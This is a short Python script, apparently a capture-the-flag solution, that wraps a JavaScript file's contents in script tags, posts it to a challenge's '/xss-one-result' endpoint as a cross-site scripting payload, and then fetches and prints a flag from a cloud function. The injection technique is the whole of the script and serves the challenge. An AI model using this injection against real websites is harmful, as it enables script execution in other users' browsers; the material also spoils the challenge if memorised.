import sys
import requests 

if len(sys.argv) != 2:
    print("Please specify challenge URL")
    print("python solution.py <challenge-url>")
else:  
	f = open("payload1.js", "r")
	vector = '<script>'
	vector += f.read()
	vector += '</script>'
	param = {'payload':vector}
	response = requests.post(sys.argv[1] + '/xss-one-result', data=param)
	# print(response.text)
	response = requests.get('https://us-west1-arboretum-backend.cloudfunctions.net/print-flag')
	print(response.text)